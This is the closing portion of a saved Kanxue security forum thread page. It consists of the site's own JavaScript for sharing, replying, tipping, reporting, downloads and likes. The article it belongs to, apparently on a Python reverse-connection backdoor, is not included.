$(document).scroll(function(){
	$(".mobile_more_operate").hide();
})
$(document).on("click", function(e){

	if ($(e.target).parents(".mobile_more_operate_btn").length == 0 && !$(e.target).hasClass('mobile_more_operate_btn')) {
		$(".mobile_more_operate").hide();
	}
	
})
// 回复 操作按钮 手机端 显示隐藏方法 结束

function show_level(event) {
	var el = event.target;
	
	var usergid = $(el).attr("data-gid");
	$.tips('<span class="level-'+usergid+' level"></span>', $(el), {
		tips: [3, '#fff'],
		time: 2000
	});
}

function show_online_level(event) {
	var el = event.target;
	
	var userdesc = $(el).attr("data-desc");

	$.tips('<span class="text-muted">'+userdesc+'</span>', $(el), {
		tips: [3, '#fff'],
		time: 2000
	});
}
function online_time_imgs(v) {

	var online_time = $(v).data('online_time');
	var level = qqLevel.getLevel(online_time);
	var imgs = qqLevel.getImg(level, [
		'//'+passport_domain+'/pc/view/img/star_0.gif',
		'//'+passport_domain+'/pc/view/img/star.gif',
		'//'+passport_domain+'/pc/view/img/moon.gif',
		'//'+passport_domain+'/pc/view/img/sun.gif',
		'//'+passport_domain+'/pc/view/img/king.gif',
	]);
	var desc = qqLevel.getDesc(online_time);
	$(v).attr('data-desc', desc);
	$(v).html(imgs);
}
$(".post_online_time").each(function(k, v) {
	online_time_imgs(v)
})

// 快速回帖切换到高级回复时，编辑框文字保存一下来
$('.senior_reply').on('click', function(){
	var  quick_reply_message = $('#quick_reply_form').find('#message').val().trim();

	// quick_reply_message = quick_reply_message.replace(/\[em_([0-9]+)\]/g, '<img src="/view/img/face/$1.gif" class="face" style="cursor: pointer;">');
	
	function senior_reply_pdata(return_obj) {
		$.pdata('quick_reply_message', quick_reply_message);
		return return_obj();
	}
	function senior_reply_return(){
		window.location.href= 'post-create-224228.htm';
	};
	senior_reply_pdata(senior_reply_return);
	
})






function shareTo(stype){
	var ftit = '';
	var flink = '';
	var lk = '';
	//获取文章标题
	ftit = $('.subject').text();
	//获取网页中内容的第一张图片
	flink = $('.message img').eq(0).attr('src');

	if(typeof flink == 'undefined'){
		flink='';
	}
	//当内容中没有图片时，设置分享图片为网站logo
	if(flink == ''){
		lk = 'http://bbs.pediy.com/plugin/kanxue/img/kanxuelogo.png';
	}
	//如果是上传的图片则进行绝对路径拼接
	if(flink.indexOf('upload/') != -1) {
		lk = 'http://bbs.pediy.com/'+flink;
	}
	//qq空间接口的传参
	if(stype=='qzone'){
		var iw=800; //弹出窗口的宽度;
		var ih=500; //弹出窗口的高度;
		var it = (window.screen.availHeight-30-ih)/4; //获得窗口的垂直位置;
		var il = (window.screen.availWidth-10-iw)/4; //获得窗口的水平位置;
		var openurl = 'https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url='+document.location.href+'?sharesource=qzone&title='+ftit+'&pics='+lk+'&summary='+document.querySelector('meta[name="description"]').getAttribute('content');
		window.open(openurl,"","height="+ih+", width="+iw+", top="+it+", left="+il);
	}
	//新浪微博接口的传参
	if(stype=='sina'){
		var iw=500; //弹出窗口的宽度;
		var ih=500; //弹出窗口的高度;
		var it = (window.screen.availHeight-30-ih)/4; //获得窗口的垂直位置;
		var il = (window.screen.availWidth-10-iw)/4; //获得窗口的水平位置;
		var openurl = 'http://service.weibo.com/share/share.php?url='+document.location.href+'?sharesource=weibo&title='+ftit+'&pic='+lk;
		window.open(openurl,"","height="+ih+", width="+iw+", top="+it+", left="+il);
	
	}
	//qq好友接口的传参
	if(stype == 'qq'){
		var iw=800; //弹出窗口的宽度;
		var ih=500; //弹出窗口的高度;
		var it = (window.screen.availHeight-30-ih)/4; //获得窗口的垂直位置;
		var il = (window.screen.availWidth-10-iw)/4; //获得窗口的水平位置;
		var openurl = 'http://connect.qq.com/widget/shareqq/index.html?url='+document.location.href+'?sharesource=qzone&title='+ftit+'&pics='+lk+'&summary='+document.querySelector('meta[name="description"]').getAttribute('content')+'&desc=看雪学院，一个有情怀的安全开发者交流的网站'
		window.open(openurl,"","height="+ih+", width="+iw+", top="+it+", left="+il);
	}
	//生成二维码给微信扫描分享，php生成，也可以用jquery.qrcode.js插件实现二维码生成
	if(stype == 'wechat'){
		
		$.tips('<img width="150" src="bbs_qrcode-http_3A_2F_2Fbbs_2epediy_2ecom_2Fthread_2d224228_2ehtm.htm">',$("#wxshare"),{ tips: [2, '#eee'],time: 5000});
	}
}
$(function() {
	var jform = $('#quick_reply_form');
	var jsubmit = $('#submit');
	jform.on('submit', function() {
		jform.reset();
		jsubmit.button('loading');
		var postdata = jform.serialize();
		$.xpost(jform.attr('action'), postdata, function(code, message) {
			if (code == 0) {
				var s = '<table>' + message + '</table>';
				var jtr = $(s).find('tr');
				jtr.insertBefore($('table.postlist tr').last());
				jsubmit.button('reset');
				$('#message').val('');

				// 楼层 +1
				var jfloor = jform.find('.floor');
				jfloor.html(xn.intval(jfloor.html()) + 1);

				// 回复数 +1
				var jposts = $('.posts');
				jposts.html(xn.intval(jposts.html()) + 1);

			} else if (code < 0) {
				$.alert(message);
				jsubmit.button('reset');
			} else {
				jform.find('[name="' + code + '"]').alert(message).focus();
				jsubmit.button('reset');
			}
		});
		return false;
	});


	//收藏功能
	var jfavorite = $('#favorite');
	var jlikes = $('#likes');
   
	jfavorite.on('click', function() {
		var likenum = jlikes.text();
		likenum_plus = parseInt(likenum) + 1;
		likenum_sub = parseInt(likenum) - 1;
		if(likenum_sub < 0) likenum_sub = 0;
		$.xpost('thread-favorite-224228.htm', function(code, message) {
			if(code == 0) {
				var s = '<a href="javascript:void(0)" title="取消收藏"><i class="icon-star-o" style="color: #0099ee;"></i>&nbsp;<span style="color: #0099ee;">已收藏</span></a>';
				jfavorite.html(s);
				jlikes.text(likenum_plus);

			}else if(code == 1) {
				var s = '<a href="javascript:void(0)" title="点我收藏"><i class="icon-star-o"></i>&nbsp;收藏</a>';
				jfavorite.html(s);
				jlikes.text(likenum_sub);
			} else {
				$.alert(message);
			}
		});
		return false;
	});
	// 缩放图片，适应屏幕大小。
	function resize_image() {
		var jmessagelist = $('div.message');
		var first_width = jmessagelist.width(); // 815 : 746; //  734 746
		jmessagelist.each(function() {
			var jdiv = $(this);
			var maxwidth = jdiv.attr('isfirst') ? first_width : first_width - 79; //  734 746
			var jmessage_width = Math.min(jdiv.width(), maxwidth);
			jdiv.find('img, embed, iframe').each(function() {
				var jimg = $(this);
				//if(jimg.width() < 500) return;
				var img_width = this.org_width;
				var img_height = this.org_height;
				if (!img_width) {
					var img_width = jimg.width();
					var img_height = jimg.height();
					this.org_width = img_width;
					this.org_height = img_height;
				}
				//var percent = xn.min(100, xn.ceil((img_width / jmessage_width) * 100));
				if (img_width > jmessage_width) {
					if (this.tagName == 'IMG') {
						jimg.width(jmessage_width);
						jimg.css('height', 'auto');
					} else {
						jimg.width(jmessage_width);
						var height = (img_height / img_width) * jimg.width();
						jimg.height(height);
					}
				}

			});
			
			jdiv.find('p').each(function() {
				var jp = $(this);
				if($.trim(jp.text()) == '') {
					jp.css('line-height', '1');
				}
			});
		});
	}
	// resize_image();
	// $(window).on('resize', resize_image);


 	//---------by wang start------------------------//
	//取出tr的pid，赋值给tr使name为point_pid
	// $(".post").each(function() {
	// 	var cpid = $(this).attr("pid");
	// 	$(this).attr("id","point_"+ cpid);
	// });
	var url = window.location.toString();
	
	if(url.indexOf("#") != -1){
		var cpid = url.split("#")[1];
		if(cpid) {
			$(".post").each(function(k,v) {
				if($(v).attr("pid") == cpid) {
					var t = $(this).offset() ? $(this).offset().top : 0;
					//$("#frame_right").scrollTop(t);
					$("html,body").animate({scrollTop:t},800)
				}
				
			});
			
		}
	}
	
	//------------by wang end----------------------------//


	
	// 输入框自动伸缩
	var jmessage = $('#message');
	jmessage.on('focus', function() {
		if (jmessage.t) {
			clearTimeout(jmessage.t);
			jmessage.t = null;
		}
		jmessage.css('height', '6rem');
	});
	jmessage.on('blur', function() {
		jmessage.t = setTimeout(function() {
			jmessage.css('height', '2.5rem');
		}, 1000);
	});

	$('#nav_pc li[fid="32"]').addClass('active');
	$('#nav_mobile li[fid="32"]').addClass('active');

	 $(function(){
		$('.emotion').qqFace({
			id : 'facebox',
			assign:'message',
			path:'view/img/face/'
		});
	});

	$("div.message img").css("cursor","pointer");
	$("div.message img").on("click",function() {
		if (window.innerWidth > 768) {
			var img_src = $(this).attr("src");
			window.open(img_src);
		}
	})
	setTimeout(function() {
		$("div.message img").each(function(index, element) {
			if ($(element).width() >= 100) {
				$(element).addClass("div_message_boxShadow");
			}
		})
	}, 2000);
	
	function IsPC() {
		var userAgentInfo = navigator.userAgent;
		var Agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
		var flag = true;
		for (var v = 0; v < Agents.length; v++) {
			if (userAgentInfo.indexOf(Agents[v]) > 0) {
				flag = false;
				break;
			}
		}
		return flag;
	}

	// 弹出分享页面

	$(".bbsshare_btn").on('click', function(event){
		$.open({
			type: 1,
			title: false,
			content: $('.bd-bbsshare-modal-sm'),
			offset: 'auto',
			shadeClose: false,
			shade: false,

		});

	});

	if ($.pdata('collapse_reward') && $.pdata('collapse_reward') == 1) {
		$("#collapse_reward").removeClass('show');
		$(".collapse_btn").find("span").html("展开");
		$(".collapse_btn").find("i").removeClass("icon-angle-up").addClass("icon-angle-down");
		
	} else if( $.pdata('collapse_reward') == 0 || $.pdata('collapse_reward') == '') {
		$("#collapse_reward").addClass('show');
		$(".collapse_btn").find("span").html("收起");
		$(".collapse_btn").find("i").removeClass("icon-angle-down").addClass("icon-angle-up");
	}
	$("#collapse_reward").on('hide.bs.collapse', function () {
		$.pdata('collapse_reward', 1)
		$(".collapse_btn").find("span").html("展开");
		$(".collapse_btn").find("i").removeClass("icon-angle-up").addClass("icon-angle-down");
		
		
	})
	$("#collapse_reward").on('show.bs.collapse', function () {
		$.pdata('collapse_reward', 0)
		$(".collapse_btn").find("span").html("收起");
		$(".collapse_btn").find("i").removeClass("icon-angle-down").addClass("icon-angle-up");
		
	})
	
});


</script>

<div style="position: absolute;top: 50%;left: 50%;transform: translateX(-50%) translateY(-50%);" class="modal fade bd-example-modal-sm" id="wxpay_modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-sm">

    <div class="modal-content text-center ">
        <div class="" style="height: 55px; border-bottom: 1px solid rgba(204, 204, 204, 0.26); background-image: url(./view/img/pay_s.png); background-repeat: no-repeat; background-position: bottom center;">
            <button type="button" class="close mr-3" style="margin-top: 1.5rem;" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">×</span>
                <span class="sr-only">Close</span>
            </button>
        </div>
        <div class="wxpay_modal_body">

        </div>
    </div>
</div>
</div>
<script>
var jpay_form = $('#pay_kx');
var jkxpay = $('.kx-pay');
var rid = 0;
var check_handle = null;

function topay(){
    clearInterval(check_handle);
    check_handle = null;
    var valtype = $("input[name='reward_type']:checked").val();
    var rmbstype = $("input[name='reward_rmbs']:checked").val();
    if(!valtype) { alert('请您选择一个支付方式!'); return false; }
    if(rmbstype < 1) {
        alert("打赏金额不能少于1元");
        return false;
    }else if(valtype == 1){
        if(_is_weixin) {
            $.alert('请用其它浏览器打开再用赞赏功能!');
            return false;
        }

        window.Popup = window.open('about:blank', '_blank','width='+window.screen.width+',height='+window.screen.height+', ...');
        var ptdata = jpay_form.serialize();
        jkxpay.button('loading');
        $.xpost('reward_pay-charge.htm', ptdata, function(code, message) {
            if(code == 0) {
                Popup.blur();
                Popup.opener.focus();
                Popup.location = 'reward_pay-reward_alipay-'+ message +'.htm';
                jkxpay.button('reset');
                $('.reward').modal('hide');
                check_setInterval(message);
            } else if(code < 0) {
                Popup.close();
                alert(message);
                jkxpay.button('reset');
            } else {
                Popup.close();
                alert(message);
                jkxpay.button('reset');
            }
        });
        return false;
    }else if(valtype == 2){
        var postdata = jpay_form.serialize();
        jkxpay.button('loading');
        $.xpost('reward_pay-reward_remainder.htm', postdata, function(code, message) {
            if(code == 0) {
                $.alert(message);
                jkxpay.button('reset');
                $('.reward').modal('hide');
                window.location.reload();
            } else if(code < 0) {
               $.alert(message);
                jkxpay.button('reset');
            } else {
                $.alert(message);
                jkxpay.button('reset');
            }
        });
        return false;
    }else if(valtype == 3) {

        // $('#wxpay_modal').modal({backdrop: 'static', keyboard: false});
        var ptdata = jpay_form.serialize();
        jkxpay.button('loading');
        $.xpost('reward_pay-charge.htm', ptdata, function(code, message) {
            if(code == 0) {
                //微信支付
                $.xget('reward_pay-wxpay-'+ message +'.htm',function(cd,msg) {
                    if(cd == 0) {
                        check_setInterval(message);

                        //$(".wxpay_code img").attr('src', 'http://paysdk.weixin.qq.com/example/qrcode.php?data='+ msg);
                        var wx_img = '<div class="pt-3 text-center"><img src="./view/img/wxpay2.png" style="height: 40px;"></div>\
                        <div class="modal-body wxpay_code pt-3 pb-3">\
                            <div  style="width: 80%;text-align:center; margin: 0 auto;">\
                                <span class="wx_img"><img alt="扫码支付" style="width: 60%;" src="//bbs.pediy.com/reward_pay-wxcode-'+ xn.urlencode(msg) +'.htm"/></span>\
                                <span class="pay_success_shadow" style="display: none;"></span>\
                            </div>\
                            <div class="text-center text-muted mt-3">打开微信扫一扫，即可完成支付</div>\
                            <div class="swal2-icon swal2-success swal2-animate-success-icon">\
                                <span class="swal2-success-line-tip "></span>\
                                <span class="swal2-success-line-long "></span></div></div>';  
                        $(".wxpay_modal_body").html(wx_img);
                        jkxpay.button('reset');
                        $(".reward").modal('hide');
                        $('#wxpay_modal').modal({backdrop: 'static', keyboard: false});
                        $('#wxpay_modal').modal('show');
                    } else {
                        $.alert(msg);
                        jkxpay.button('reset');
                    }
                })
                return false;
            } else {
                $.alert(message);
                jkxpay.button('reset');
            }
        });
      
        return false;

    }else{
        $('.reward').modal('hide');
        return false;
    }
}

function check_status(rid) {
  var val_type = $("input[name='reward_type']:checked").val();
  $.xpost('reward_pay-check.htm', {checkid: rid}, function(code, message) {
    if(code == 0) {
      if(val_type == 1) {
        Popup.close();
      }
      $.alert('恭喜您，赞赏成功！');
      setTimeout(function() {
                 window.location.reload();
      }, 3000);
      // if(check_handle) {
        clearInterval(check_handle);
        check_handle = null;
      // }
    } else {
      return false;
    }
  });
}

function check_setInterval(rid) {
  check_handle = setInterval(function() {
    check_status(rid);
  }, 3000);
}

window._is_weixin = function() {
  var _ua = window.navigator.userAgent.toLowerCase();
  if (_ua.match(/MicroMessenger/i) == 'micromessenger') {
      return true;
  } else {
      return false;
  }
}()


$("select.reward_reason").change(function(){

    console.log( $("select.reward_reason option:selected").val());
    var reward_reason = $("select.reward_reason option:selected").val()
    if (reward_reason != 0) {
        $(".reward_reason_textarea").val($("select.reward_reason option:selected").val());
    }
    
    
})

</script><script>
var jform_appeal = $('#form_appeal');
var appeal_submit = $('#appeal_submit');

appeal_submit.on('click', function() {
    jform_appeal.reset();
    appeal_submit.button('loading');
    var postdata = jform_appeal.serialize();
    
    $.xpost(jform_appeal.attr('action'), postdata, function(code, message) {
        if(code == 0) {
       	$.alert(message);
       	appeal_submit.button('reset');
       	setTimeout(function(){window.location.reload();
            }, 2000);
        } else {
    	$.alert(message);
    	appeal_submit.button('reset');
        }
    });
    return false;
});

 $('#appeal').on('show.bs.modal', function (event) {
	var button = $(event.relatedTarget)
	var pid = button.data('pid');
	var modal = $(this);
	modal.find('.modal-body #pid').val(pid);

})
</script><script>

var jform_report = $('#form_report');
var report_submit = $('#report_submit');

report_submit.on('click', function() {
    jform_report.reset();
    report_submit.button('loading');
    var postdata = jform_report.serialize();
    
    $.xpost(jform_report.attr('action'), postdata, function(code, message) {
        if(code == 0) {
       	$.alert(message);
       	report_submit.button('reset');
       	setTimeout(function(){window.location.reload();
            }, 1000);
        } else {
    	$.alert(message);
    	report_submit.button('reset');
        }
    });
    return false;
});

$('#report').on('show.bs.modal', function (event) {
	var button = $(event.relatedTarget)
    var tid = button.data('tid');
    var pid = button.data('pid');
    var modal = $(this);

    modal.find('.modal-body #tid').val(tid);
    modal.find('.modal-body #pid').val(pid);
})

</script><!--游客下载附件关注微信公众号-->
<div class="modal fade download_code" id="download_code" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-sm" role="document">
                <div class="modal-content">
                        <div class="modal-header">
	                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
	                                <span aria-hidden="true">×</span>
	                        </button>
	                        <h5 class="modal-title" id="exampleModalLabel">游客下载提示</h5>
                        </div>
                        <form id="form_download" action="https://bbs.pediy.com/thread-224228.htm" method="post" target="_blank">
                                <div class="modal-body text-center">
                                    <input id="aid" name="aid" value="0" type="hidden">
                                    <dl class="row">
                                    	<dd class="text-left" style="width:50%">
                                        	<div style="font-size:14px">
                                        		<div>1.请先关注公众号。</div>
                                        		<div>2.点击菜单"更多"。</div>
                                        		<div>3.选择获取下载码。</div>
                                        	</div>
                                    	</dd>
                                    	<dt><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/wxgz.jpg" width="80%"></dt>
                                    </dl>
                                    <fieldset class="form-group">
                						<input class="form-control" type="text" id="download_code" name="download_code" placeholder="请输入下载码" value="">
                					</fieldset>
                                </div>
                                <div class="modal-footer">
                                        <button id="download_submit" type="button" class="btn btn-primary" data-loading-text="正在提交...">下载</button>
                                </div>
                        </form>
                </div>
        </div>
</div>

<script>

var jform_download = $('#form_download');
var jdownload_submit = $('#download_submit');

jdownload_submit.on('click', function() {
    jform_download.reset();
    jdownload_submit.button('loading');
    var postdata = jform_download.serialize();

    var aid2 = jform_download.find('.modal-body #aid').val();
    
    $.xpost(jform_download.attr('action'), postdata, function(code, message) {
        if(code == 0) {
	       	jdownload_submit.button('下载中...');
	       	var href = "attach-download-"+aid2+"-"+message+".htm";
		window.location = href;
		setTimeout(function() {
                    jdownload_submit.button('reset');
                    jform_download.find('.modal-body #download_code').val('');
                }, 1500);
		
        } else {
	    	$.alert(message);
	    	jdownload_submit.button('reset');
        }
    });
    return false;
});

$('#download_code').on('show.bs.modal', function (event) {
    var button = $(event.relatedTarget)
    var aid = button.data('aid');
    var modal = $(this);
    var down_action="attach-download_code-"+aid+".htm";

    modal.find('.modal-body #aid').val(aid);
    modal.find('#form_download').attr('action', down_action);
})

</script><script>
var page = '1';
$('#thumb').click(function() {
	var threadid = '224228';
	var type = 1;
	var num = parseInt($('#thread_thumb_num').text());
	var postdata = 'threadid=' + threadid + '&type=1&page='+page;
	var that = this;
	$.xpost('thumbs_up-thumbs.htm', postdata, function(code, message) {
		if(code == 0) {
			var s = '<i class="icon-thumbs-o-up" style="color: #0099ee;"></i>&nbsp;<span style="color: #0099ee;">已赞</span>';
			$('#thumb').children('a').html(s);
			$('#thread_thumb_num').text(num + 1);
			$.tips('感谢您的赏识！您已向主题帖作者发送 '+message+' 个雪币，表达感谢', $(that), {
				tips:1,
				time: 2000,
				tips: [1,'#748691']

			});
		} else {
			$.tips(message, $(that), {
				tips: 1,
				time: 2000,
				tips: [1,'#748691']

			});
		}
	})
})
</script>

<script>
$(document).on('click','.reply_thumb',function(){
	
	var index = $('.reply_thumb').index(this);
	var threadid = $(this).find('input').eq(0).val();
	var praised_uid = $(this).find('input').eq(1).val();
	var pid = $(this).find('input').eq(2).val();
	var num = parseInt($('.thumb_num').eq(index).text());
	
	var postdata = 'threadid=' + threadid + '&praised_uid=' + praised_uid +'&pid=' + pid + '&type=2&page='+page;
	var that = this;
	$.xpost('thumbs_up-thumbs.htm', postdata, function(code, message) {
    	if(code == 0) {
            var s = '<i class="icon-thumbs-o-up" style="color: #0099ee;"></i>';
            var new_num = num + 1;
            $('.reply_thumb').eq(index).children('a').html(s);
	    $('.thumb_num').eq(index).text(num + 1);
	    	$.tips('英雄所见略同！您已向该回帖发送  '+message+' 个雪币，表达感谢', $(that), {
			tips: [1,'#748691'],
			time: 4000,
			
		});
        } else {
		$.tips(message, $(that), {
			
			time: 4000,
			tips: [1,'#748691']
		});
	}
	})
})
</script><script>
xn_read_unread({"224228": "1525419370"}, 224228);
</script><script>
jsearch_form = $('#search_form');
jsearch_form.on('submit', function() {
	var keyword = jsearch_form.find('input[name="keyword"]').val();
	var url = xn.url('search-'+xn.urlencode(keyword));
	window.location = url;
	return false;
});
</script><script>
// 语法高亮
if($('div.message pre').length > 0) {
	$.require_css('plugin/xn_syntax_hightlighter/syntax_hightlighter/syntax.css');
	$.require('plugin/xn_syntax_hightlighter/syntax_hightlighter/syntax.js', function() {
		SyntaxHighlighter.all();
	});
}
</script>

<div class="layui-layer-move"></div></body></html>